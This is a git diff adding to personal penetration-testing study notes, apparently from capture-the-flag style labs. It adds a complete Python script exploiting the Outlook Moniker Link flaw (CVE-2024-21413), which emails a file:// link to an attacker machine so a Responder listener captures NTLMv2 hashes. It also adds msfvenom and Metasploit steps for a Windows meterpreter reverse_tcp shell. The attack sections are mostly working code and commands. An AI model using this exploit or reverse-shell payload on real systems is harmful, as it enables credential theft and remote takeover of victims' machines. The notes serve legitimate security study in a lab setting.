@@ -562,6 +562,94 @@ ssh2john [id_rsa private key file] > [output file]
     >: This is the output director. We’re using it to redirect the output from this command to another file.
     [output file]: This is the file that will store the output from
 
+**Vulnerabilities**
+
+_Moniker Link (CVE-2024-21413)_
+Critical
+
+Moniker Links: external links in emails that lead to other applications
+
+- adding ! bypasses the protected view triggered by external links
+
+<p><a href="file://ATTACKER_MACHINE/test!exploit">Click me</a></p\
+
+Attacking
+1. create a responder listener on terminal: responder -I ens5
+2. created nano exploit.py, pasted below exploit, subbed moniker link with my IP address and the MAILSERVER with 10.201.36.10
+
+exploit----
+'''
+Author: CMNatic | https://github.com/cmnatic
+Version: 1.0 | 19/02/2024
+'''
+
+import smtplib
+from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
+from email.utils import formataddr
+
+sender_email = 'attacker@monikerlink.thm' # Replace with your sender email address
+receiver_email = 'victim@monikerlink.thm' # Replace with the recipient email address
+password = input("Enter your attacker email password: ")
+html_content = """\
+<!DOCTYPE html>
+<html lang="en">
+    <p><a href="file://ATTACKER_MACHINE/test!exploit">Click me</a></p>
+
+    </body>
+</html>"""
+
+message = MIMEMultipart()
+message['Subject'] = "CVE-2024-21413"
+message["From"] = formataddr(('CMNatic', sender_email))
+message["To"] = receiver_email
+
+# Convert the HTML string into bytes and attach it to the message object
+msgHtml = MIMEText(html_content,'html')
+message.attach(msgHtml)
+
+server = smtplib.SMTP('MAILSERVER', 25)
+server.ehlo()
+try:
+    server.login(sender_email, password)
+except Exception as err:
+    print(err)
+    exit(-1)
+
+try:
+    server.sendmail(sender_email, [receiver_email], message.as_string())
+    print("\n Email delivered")
+except Exception as error:
+    print(error)
+finally:
+    server.quit()
+
+exploit-----
+
+3. Traffic is captured and authentication (netNTLMv2)
+
+**Metasploit**
+
+A widely known exploitation framework. Used for gathering, scanning, exploitation, exploit development, post-exploitation, and more
+
+1. msfconsole: the main comman-line interface
+2. modules: supporting modules such as exploits, scanners, payloads, etc...
+3. tools: standalone toolks that help vulnerability research, assessment or pen testing. msfvenom, pattern_create, pattern_offset
+
+- Exploit: A piece of code that uses a vulnerability present on the target system.
+- Vulnerability: A design, coding, or logic flaw affecting the target system. The exploitation of a vulnerability can result in disclosing confidential information or allowing the attacker to execute code on the target system.
+- Payload: An exploit will take advantage of a vulnerability. However, if we want the exploit to have the result we want (gaining access to the target system, read confidential information, etc.), we need to use a payload. Payloads are the code that will run on the target system.
+
+Launch on linux - msfconsole
+Metasploit-framework directory: /usr/share/metasploit-framework
+
+
+Exploitation steps: https://www.youtube.com/watch?v=xuYZNJCvHgQ
+1. create payload: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.13.96.225 LPORT=4444 -f psh-cmd
+2. setup listener on msfconsole: use exploit/multi/handler
+3. set payload windows/x64/meterpreter/reverse_tcp (matches what was created as the payload name)
+4. set LHOST to correct listener on machine (ifconfig, etho IP): set LHOST 192.168.1.121
+5. start listener: exploit
 
 **WINDOWS**
 
